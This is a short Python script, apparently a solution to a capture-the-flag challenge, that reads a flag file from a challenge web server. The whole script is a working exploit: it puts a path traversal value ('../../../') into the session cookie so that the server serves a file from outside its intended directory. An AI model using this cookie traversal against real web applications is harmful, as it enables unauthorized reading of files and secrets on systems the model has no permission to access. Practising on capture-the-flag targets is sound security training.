#!/usr/bin/env python3
import requests

url = 'http://challs.crate.nu:2580'

cookies = {"session": "../../../"}

r = requests.get(url + '/uploaded/flag.txt', cookies=cookies)
print(r.text)
